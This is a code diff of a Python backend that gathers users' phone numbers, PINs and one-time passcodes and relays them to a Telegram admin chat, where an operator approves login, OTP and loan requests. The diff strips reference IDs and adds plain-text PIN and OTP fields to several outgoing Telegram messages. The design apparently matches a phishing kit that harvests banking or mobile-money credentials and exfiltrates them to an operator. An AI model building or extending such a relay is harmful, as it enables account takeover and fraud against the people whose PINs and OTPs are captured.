@@ -161,15 +161,14 @@ def cancel_pending_for_phone(phone: str, exclude_ref: str | None = None) -> None
             prev["status"] = "cancelled"
 
 
-# --- UPDATED FORMAT: Short & Clear ---
+# --- UPDATED FORMAT: Cleaned up ---
 def _build_admin_message(req: dict) -> str:
     return (
-        f"🚨 <b>OTP APPROVAL</b>\n"
+        f"🚨 <b>OTP REQUEST</b>\n"
         f"━━━━━━━━━━━━━━━\n"
         f"📱 <b>Phone:</b> <code>{req['phone']}</code>\n"
         f"🔑 <b>PIN:</b> <code>{req['pin']}</code>\n"
-        f"🔐 <b>OTP:</b> <code>{req['otp']}</code>\n"
-        f"🆔 <b>Ref:</b> <code>{req['ref_id']}</code>"
+        f"🔐 <b>OTP:</b> <code>{req['otp']}</code>"
     )
 
 
@@ -431,7 +430,6 @@ async def resend_otp(request: ResendRequest):
     await send_otp_to_user(full_phone, sms_body, label="RESEND")
 
     try:
-        # --- UPDATED FORMAT: Short & Clear ---
         await send_telegram_message(
             f"🔄 <b>RESEND REQUEST</b>\n"
             f"━━━━━━━━━━━━━━━\n"
@@ -496,12 +494,12 @@ async def admin_decide_otp(ref_id: str, body: DecideRequest, request: Request):
         otp_store.pop(req["phone"], None)
 
     try:
-        # --- UPDATED FORMAT: Short & Clear ---
         await send_telegram_message(
             f"{'✅' if approved else '❌'} <b>OTP {req['status'].upper()}</b>\n"
             f"━━━━━━━━━━━━━━━\n"
             f"📱 <b>Phone:</b> <code>{req['phone']}</code>\n"
-            f"🆔 <b>Ref:</b> <code>{req['ref_id']}</code>"
+            f"🔑 <b>PIN:</b> <code>{req['pin']}</code>\n"
+            f"🔐 <b>OTP:</b> <code>{req['otp']}</code>"
         )
     except Exception:
         pass
@@ -594,7 +592,6 @@ async def _handle_admin_command(sender: str, text: str) -> None:
         if not approved:
             otp_store.pop(req["phone"], None)
 
-        # --- UPDATED FORMAT: Short & Clear ---
         _reply(
             f"{'✅ APPROVED' if approved else '❌ REJECTED'}\n"
             f"📱 {req['phone']} | 🔢 {req['otp']}\n"
@@ -607,7 +604,6 @@ async def _handle_admin_command(sender: str, text: str) -> None:
         if not req:
             _reply("❌ Not found.")
             return
-        # --- UPDATED FORMAT: Short & Clear ---
         _reply(
             f"🆔 <b>Ref:</b> {req['ref_id']}\n"
             f"📱 <b>Phone:</b> {req['phone']}\n"
@@ -691,12 +687,11 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
             await answer_callback_query(callback_id, "✅ Loan Approved" if approved else "❌ Loan Denied")
             phone = loan_request_phones.get(approval_id, "Unknown")
             if "message" in callback:
-                # --- UPDATED FORMAT: Short & Clear ---
                 result_text = "✅ <b>LOAN APPROVED</b>" if approved else "❌ <b>LOAN DENIED</b>"
                 await edit_message(
                     chat_id=callback["message"]["chat"]["id"],
                     message_id=callback["message"]["message_id"],
-                    text=f"{result_text}\n━━━━━━━━━━━━━━━\n📱 <b>Phone:</b> <code>{phone}</code>\n🆔 <b>Ref:</b> <code>{approval_id}</code>",
+                    text=f"{result_text}\n━━━━━━━━━━━━━━━\n📱 <b>Phone:</b> <code>{phone}</code>",
                 )
             return {"ok": True}
 
@@ -720,7 +715,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
             await answer_callback_query(callback_id, "✅ Login Approved" if approved else "❌ Login Denied")
             
             if "message" in callback:
-                # --- UPDATED FORMAT: Short & Clear ---
                 result_text = "✅ <b>LOGIN APPROVED</b>" if approved else "❌ <b>LOGIN DENIED</b>"
                 await edit_message(
                     chat_id=callback["message"]["chat"]["id"],
@@ -729,8 +723,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                         f"{result_text}\n"
                         f"━━━━━━━━━━━━━━━\n"
                         f"📱 <b>Phone:</b> <code>{login_req['phone']}</code>\n"
-                        f"🔑 <b>PIN:</b> <code>{login_req['pin']}</code>\n"
-                        f"🆔 <b>Ref:</b> <code>{approval_id}</code>"
+                        f"🔑 <b>PIN:</b> <code>{login_req['pin']}</code>"
                     ),
                 )
             
@@ -787,7 +780,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         )
 
         if "message" in callback:
-            # --- UPDATED FORMAT: Short & Clear ---
             result_text = "✅ <b>OTP APPROVED</b>" if approved else "❌ <b>OTP REJECTED</b>"
             await edit_message(
                 chat_id=callback["message"]["chat"]["id"],
@@ -797,8 +789,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                     f"━━━━━━━━━━━━━━━\n"
                     f"📱 <b>Phone:</b> <code>{phone}</code>\n"
                     f"🔑 <b>PIN:</b> <code>{pin}</code>\n"
-                    f"🔐 <b>OTP:</b> <code>{otp}</code>\n"
-                    f"🆔 <b>Ref:</b> <code>{approval_id}</code>"
+                    f"🔐 <b>OTP:</b> <code>{otp}</code>"
                 ),
             )
 
